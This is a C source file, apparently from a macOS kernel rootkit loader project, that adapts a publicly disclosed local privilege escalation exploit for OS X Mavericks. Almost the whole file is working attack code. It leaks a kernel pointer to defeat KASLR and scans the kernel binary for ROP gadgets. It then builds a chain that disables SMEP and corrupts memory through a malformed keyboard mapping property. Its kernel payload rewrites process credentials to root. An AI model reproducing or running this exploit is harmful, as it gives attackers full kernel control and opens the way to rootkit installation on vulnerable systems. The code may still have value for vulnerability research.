/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.     .----.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'    \_,-.  |
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.        .' .'
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'       .'  /_
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.     |      |
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'     `------'
 *
 * A kernel rootkit load based on AppleHWAccess kernel extension for Yosemite and Mavericks
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * exploit.c
 * This is Ian Beer's exploit that works on Mavericks but patched in Yosemite
 * https://code.google.com/p/google-security-research/issues/detail?id=126&can=1
 *
 * Slightly modified to remove dependencies on some utils that aren't available
 * on default OS X installations
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include "exploit.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>

#include "utils.h"
#include "kernel_symbols.h"
#include "logging.h"


static uint64_t leak(void);
static uint64_t load_addr(void);
static uint64_t leaked_offset_in_kext(void);
void rebase_kernel_payload(struct kernel_info *kinfo);
uint64_t* build_vtable(uint64_t kaslr_slide, uint64_t payload, size_t* len);
void trigger(void* vtable, size_t vtable_len, const char * argv[]);
void kernel_payload(void);

void (*IOLockUnlock) (void*);
int (*KUNCExecute)(char*, int, int);
void (*thread_exception_return)();
void* (*proc_ucred)(void*);
void* (*kauth_cred_get)();
void* (*kauth_cred_setuidgid)(void*, int, int);
void* (*current_proc)();

int
get_me_r00t(uint8_t *kernel_buffer, struct kernel_info *kinfo, const char * argv[])
{
    int kernel_version = get_kernel_version();
    if (kernel_version != 13)
    {
        ERROR_MSG("Exploit only supported in Mavericks!");
        return -1;
    }
    
    uint64_t leaked_ptr = leak();
    uint64_t kext_load_addr = load_addr();
    
    // get the offset of that pointer in the kext:
    uint64_t offset = leaked_offset_in_kext(); //0x8cf0;
    
    // sanity check the leaked address against the symbol addr:
    if ( (leaked_ptr & 0xfff) != (offset & 0xfff) ){
        ERROR_MSG("the leaked pointer doesn't match up with the expected symbol offset");
        return -1;
    }
    uint64_t kaslr_slide = (leaked_ptr - offset) - kext_load_addr;
    kinfo->kaslr_slide = kaslr_slide;
    DEBUG_MSG("kaslr slide: %p\n", (void*)kaslr_slide);
    rebase_kernel_payload(kinfo);
    
    size_t vtable_len = 0;
    void* vtable = build_vtable(kaslr_slide, kernel_payload, &vtable_len);
    
    trigger(vtable, vtable_len, argv);

    return 0;
}

static uint64_t
leak(void)
{
    io_iterator_t iter;
    
    CFTypeRef p = IORegistryEntrySearchCFProperty(IORegistryGetRootEntry(kIOMasterPortDefault),
                                                  kIOServicePlane,
                                                  CFSTR("AAPL,iokit-ndrv"),
                                                  kCFAllocatorDefault,
                                                  kIORegistryIterateRecursively);
    
    if (CFGetTypeID(p) != CFDataGetTypeID()){
        printf("expected CFData\n");
        return 1;
    }
    
    if (CFDataGetLength(p) != 8){
        printf("expected 8 bytes\n");
        return 1;
    }
    
    uint64_t leaked = *((uint64_t*)CFDataGetBytePtr(p));
    return leaked;
}

extern CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef, CFArrayRef);

static uint64_t
load_addr(void)
{
    uint64_t addr = 0;
    CFDictionaryRef kd = OSKextCopyLoadedKextInfo(NULL, NULL);
    CFIndex count = CFDictionaryGetCount(kd);
    
    void **keys;
    void **values;
    
    keys = (void **)malloc(sizeof(void *) * count);
    values = (void **)malloc(sizeof(void *) * count);
    
    CFDictionaryGetKeysAndValues(kd,
                                 (const void **)keys,
                                 (const void **)values);
    
    for(CFIndex i = 0; i < count; i++){
        const char *name = CFStringGetCStringPtr(CFDictionaryGetValue(values[i], CFSTR("CFBundleIdentifier")), kCFStringEncodingMacRoman);
        if (strcmp(name, "com.apple.iokit.IONDRVSupport") == 0){
            CFNumberGetValue(CFDictionaryGetValue(values[i],
                                                  CFSTR("OSBundleLoadAddress")),
                             kCFNumberSInt64Type,
                             &addr);
            printf("%s: %p\n", name, addr);
            break;
        }
    }
    return addr;
}

/*
 * original version uses nm which requires developer tools to be installed
 * so open the target kext and solve ourselves the symbols
 */
static uint64_t
leaked_offset_in_kext(void)
{
    int fd = -1;
    fd = open("/System/Library/Extensions/IONDRVSupport.kext/IONDRVSupport", O_RDONLY);
    if (fd < 0)
    {
        ERROR_MSG("Can't open IONDRVSupport kext.");
        return 0;
    }
    
    struct stat stat = {0};
    if (fstat(fd, &stat) < 0)
    {
        ERROR_MSG("Can't fstat IONDRVSupport kext: %s.", strerror(errno));
        return 0;
    }
    uint8_t *buf = mmap(0, stat.st_size, PROT_READ, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED)
    {
        ERROR_MSG("Failed to mmap IONDRVSupport kext.");
        return 0;
    }
    struct mach_header_64 *mh = (struct mach_header_64*)buf;
    if (mh->magic != MH_MAGIC_64)
    {
        return 0;
    }
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        return 0;
    }
    struct load_command *load_cmd = (struct load_command*)(buf + sizeof(struct mach_header_64));
    struct segment_command_64 *linkedit = NULL;
    struct symtab_command *symtab = NULL;
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        if (load_cmd->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *sc = (struct segment_command_64*)load_cmd;
            if (strncmp(sc->segname, "__LINKEDIT", 16) == 0)
            {
                linkedit = sc;
            }
        }
        else if (load_cmd->cmd == LC_SYMTAB)
        {
            symtab = (struct symtab_command*)load_cmd;
        }
        load_cmd = (struct load_command*)((char*)load_cmd + load_cmd->cmdsize);
    }
    
    if (linkedit == NULL || symtab == NULL)
    {
        ERROR_MSG("Invalid pointers for linkedit or symtab.");
        return 0;
    }
    struct nlist_64 *nlist = NULL;
    uint64_t offset = 0;
    for (uint32_t i = 0; i < symtab->nsyms; i++)
    {
        mach_vm_address_t symbol_off = symtab->symoff - linkedit->fileoff;
        mach_vm_address_t string_off = symtab->stroff - linkedit->fileoff;
        nlist = (struct nlist_64*)((char*)(buf + linkedit->fileoff) + symbol_off + i * sizeof(struct nlist_64));
        char *symbol_string = ((char*)(buf + linkedit->fileoff) + string_off + nlist->n_un.n_strx);
        if (strncmp("__ZTV17IONDRVFramebuffer", symbol_string, strlen("__ZTV17IONDRVFramebuffer")) == 0)
        {
            offset = (nlist->n_value);
        }
    }
    
    if (offset != 0)
    {
        offset += 0x10; //offset from symbol to leaked pointer
    }
    
    munmap(buf, stat.st_size);
    close(fd);
    return offset;
}

void
rebase_kernel_payload(struct kernel_info *kinfo)
{
    IOLockUnlock = (void*)solve_kernel_symbol(kinfo, "_lck_mtx_unlock");
    KUNCExecute = (void*)solve_kernel_symbol(kinfo, "_KUNCExecute");
    thread_exception_return = (void*)solve_kernel_symbol(kinfo, "_thread_exception_return");
    proc_ucred = (void*)solve_kernel_symbol(kinfo, "_proc_ucred");
    kauth_cred_get = (void*)solve_kernel_symbol(kinfo, "_kauth_cred_get");
    kauth_cred_setuidgid = (void*)solve_kernel_symbol(kinfo, "_kauth_cred_setuidgid");
    current_proc = (void*)solve_kernel_symbol(kinfo, "_current_proc");
}


// rather than working out the offset of p_ucred in the proc structure just get
// the code to tell us :)
// proc_ucred just does return arg->u_cred
uint64_t
find_ucred_offset(void)
{
    uint64_t offsets[0x80];
    for (int i = 0; i < 0x80; i++){
        offsets[i] = i*8;
    }
    return proc_ucred(offsets);
}

uint64_t*
build_vtable(uint64_t kaslr_slide, uint64_t payload, size_t* len)
{
    uint64_t pivot, mov_rax_cr4, mov_cr4_rax, pop_rcx, xor_rax_rcx, pop_pop_ret;
    
    uint64_t kernel_base = 0;
    
    int fd = open("/mach_kernel", O_RDONLY);
    if (!fd)
        return NULL;
    
    struct stat _stat;
    fstat(fd, &_stat);
    size_t buf_len = _stat.st_size;
    
    uint8_t* buf = mmap(NULL, buf_len, PROT_READ, MAP_FILE|MAP_PRIVATE, fd, 0);
    
    if (!buf)
        return NULL;
    
    struct mach_header_64 *mh = (struct mach_header_64*)buf;
    if (mh->magic != MH_MAGIC_64)
    {
        return 0;
    }
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        return 0;
    }
    struct load_command *load_cmd = (struct load_command*)(buf + sizeof(struct mach_header_64));
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        if (load_cmd->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *sc = (struct segment_command_64*)load_cmd;
            if (strncmp(sc->segname, "__TEXT", 16) == 0)
            {
                kernel_base = sc->vmaddr;
                break;
            }
        }
        load_cmd = (struct load_command*)((char*)load_cmd + load_cmd->cmdsize);
    }
    if (kernel_base == 0)
    {
        return NULL;
    }
    kernel_base += kaslr_slide;

    /*
     this stack pivot to rax seems to be reliably present across mavericks versions:
     push rax
     add [rax], eax
     add [rbx+0x41], bl
     pop rsp
     pop r14
     pop r15
     pop rbp
     ret
     */
    uint8_t pivot_gadget_bytes[] = {0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e};
    uint8_t* pivot_loc = memmem(buf, buf_len, pivot_gadget_bytes, sizeof(pivot_gadget_bytes));
    uint64_t pivot_gadget_offset = (uint64_t)(pivot_loc - buf);
    printf("offset of pivot gadget: %p\n", pivot_gadget_offset);
    pivot = kernel_base + pivot_gadget_offset;
    
    /*
     mov rax, cr4
     mov [rcx], rax
     pop rbp
     ret
     */
    uint8_t mov_rax_cr4_gadget_bytes[] = {0x0f, 0x20, 0xe0, 0x48, 0x89, 0x01, 0x5d, 0xc3};
    uint8_t* mov_rax_cr4_loc = memmem(buf, buf_len, mov_rax_cr4_gadget_bytes, sizeof(mov_rax_cr4_gadget_bytes));
    uint64_t mov_rax_cr4_gadget_offset = (uint64_t)(mov_rax_cr4_loc - buf);
    printf("offset of mov_rax_cr4 gadget: %p\n", mov_rax_cr4_gadget_offset);
    mov_rax_cr4 = kernel_base + mov_rax_cr4_gadget_offset;
    
    /*
     mov cr4, rax
     pop rbp
     ret
     */
    uint8_t mov_cr4_rax_gadget_bytes[] = {0x0f, 0x22, 0xe0, 0x5d, 0xc3};
    uint8_t* mov_cr4_rax_loc = memmem(buf, buf_len, mov_cr4_rax_gadget_bytes, sizeof(mov_cr4_rax_gadget_bytes));
    uint64_t mov_cr4_rax_gadget_offset = (uint64_t)(mov_cr4_rax_loc - buf);
    printf("offset of mov_cr4_rax gadget: %p\n", mov_cr4_rax_gadget_offset);
    mov_cr4_rax = kernel_base + mov_cr4_rax_gadget_offset;
    
    /*
     pop rcx
     ret
     */
    uint8_t pop_rcx_gadget_bytes[] = {0x59, 0xc3};
    uint8_t* pop_rcx_loc = memmem(buf, buf_len, pop_rcx_gadget_bytes, sizeof(pop_rcx_gadget_bytes));
    uint64_t pop_rcx_gadget_offset = (uint64_t)(pop_rcx_loc - buf);
    printf("offset of pop_rcx gadget: %p\n", pop_rcx_gadget_offset);
    pop_rcx = kernel_base + pop_rcx_gadget_offset;
    
    
    /*
     xor rax, rcx
     pop rbp
     ret
     */
    uint8_t xor_rax_rcx_gadget_bytes[] = {0x48, 0x31, 0xc8, 0x5d, 0xc3};
    uint8_t* xor_rax_rcx_loc = memmem(buf, buf_len, xor_rax_rcx_gadget_bytes, sizeof(xor_rax_rcx_gadget_bytes));
    uint64_t xor_rax_rcx_gadget_offset = (uint64_t)(xor_rax_rcx_loc - buf);
    printf("offset of xor_rax_rcx gadget: %p\n", xor_rax_rcx_gadget_offset);
    xor_rax_rcx = kernel_base + xor_rax_rcx_gadget_offset;
    
    /*  need this to jump over the vtable index which will be called:
     pop r15
     pop rbp
     ret
     */
    uint8_t pop_pop_ret_gadget_bytes[] = {0x41, 0x5f, 0x5d, 0xc3};
    uint8_t* pop_pop_ret_loc = memmem(buf, buf_len, pop_pop_ret_gadget_bytes, sizeof(pop_pop_ret_gadget_bytes));
    uint64_t pop_pop_ret_gadget_offset = (uint64_t)(pop_pop_ret_loc - buf);
    printf("offset of pop_pop_ret gadget: %p\n", pop_pop_ret_gadget_offset);
    pop_pop_ret = kernel_base + pop_pop_ret_gadget_offset;
    
    munmap(buf, buf_len);
    close(fd);
    
    void* writable_scratch = malloc(8);
    memset(writable_scratch, 0, 8);
    
    uint64_t rop_stack[] = {
        0,                //pop r14
        0,                //pop r15
        0,                //pop rbp  +10
        pop_pop_ret,
        0,                //+20
        pivot,            //+28
        pop_rcx,
        (uint64_t)writable_scratch,
        mov_rax_cr4,
        0,                //pop rbp
        pop_rcx,
        0x00100000,       //SMEP bit in cr4
        xor_rax_rcx,      //flip it
        0,                //pop rbp
        mov_cr4_rax,      //write back to cr4
        0,                //pop rbp
        payload           //SMEP is now disabled so ret to payload in userspace
    };
    
    uint64_t* r = malloc(sizeof(rop_stack));
    memcpy(r, rop_stack, sizeof(rop_stack));
    *len = sizeof(rop_stack);
    return r;
}

// need to drop this IOLock:
//     IOLockLock( _deviceLock);
// at code exec time rbx points to this, and this->_delegate->deviceLock is that lock
// so need to call IOLockUnlock(rbx->_delegate->deviceLock)
void
kernel_payload(void)
{
    uint8_t* this;
    //__asm__("int $3");
    __asm__("movq %%rbx, %0" : "=r"(this) : :);
    //this now points to the IOHIKeyboardMapper
    uint8_t* IOHIKeyboard = *((uint8_t**)(this+0x10));
    void* _device_lock = *((void**)(IOHIKeyboard+0x88));
    IOLockUnlock(_device_lock);
    
    // real kernel payload goes here:
    //  KUNCExecute("/Applications/Calculator.app/Contents/MacOS/Calculator", 0, 0);
    //  thread_exception_return();
    
    // get root:
    uint64_t ucred_offset = find_ucred_offset();
    void* old_cred = kauth_cred_get();
    void* new_cred = kauth_cred_setuidgid(old_cred, 0, 0);
    uint8_t* proc = current_proc();
    *((void**)(proc+ucred_offset)) = new_cred;
    thread_exception_return();
}

void
trigger(void* vtable, size_t vtable_len, const char * argv[])
{
    kern_return_t err;
    
    CFMutableDictionaryRef matching = IOServiceMatching("IOHIDKeyboard");
    if(!matching){
        printf("unable to create service matching dictionary\n");
        return;
    }
    
    io_iterator_t iterator;
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
    if (err != KERN_SUCCESS){
        printf("no matches\n");
        return;
    }
    
    io_service_t service = IOIteratorNext(iterator);
    
    if (service == IO_OBJECT_NULL){
        printf("unable to find service\n");
        return;
    }
    printf("got service: %x\n", service);
    
    char* bad_mapping = malloc(0x10000);
    memset(bad_mapping, 0, 0x10000);
    
    uint8_t bad_header[] = {
        0x00, 0x01, // nmd.shorts = 1
        0x00, 0x00, // numMods = 0
        0x00, 0x00, // numDefs = 0
        0x00, 0x90, // numSeqs = 0x90
    };
    
    memcpy(bad_mapping, bad_header, sizeof(bad_header));
    
    uint8_t bad_seq[] = {
        0x00, 0x02, // len
        0x00, 0x78, 0x56, 0x00, // first entry
        0x00, 0x00, 0x00, 0x00, // second entry
        0xff, 0xff, // numMods
    };
    
    memcpy(bad_mapping + sizeof(bad_header) + 0x8f*2, bad_seq, sizeof(bad_seq));
    
    //need to overallocate and touch the pages since this will be the stack:
    mach_vm_address_t addr = 0x0000005678000000 - 10 * 0x1000;
    mach_vm_allocate(mach_task_self(), &addr, 0x20*0x1000, 0);
    
    memset(addr, 0, 0x20*0x1000);
    
    memcpy((void*)0x5678000200, vtable, vtable_len);
    /*
     uint64_t* vtable_entry  = (uint64_t*)(0x0000005678000200 + 0x28);
     *vtable_entry = 0x123456789abcdef0; // call this address in ring0
     */
    
    
    CFDataRef data = CFDataCreate(NULL, bad_mapping, 0x10000);
    
    err = IORegistryEntrySetCFProperty(
                                       service,
                                       CFSTR("HIDKeyMapping"),
                                       data);
    
    if (err != KERN_SUCCESS){
        printf("setProperty failed\n");
    }
    
    char *envp[] = {NULL};
    /* we don't want to loop if we keep passing -x argument */
    char *argv2[3] = { (char*)argv[0], (char*)argv[1], NULL };
    
    execve(argv2[0], argv2, envp);
    
}
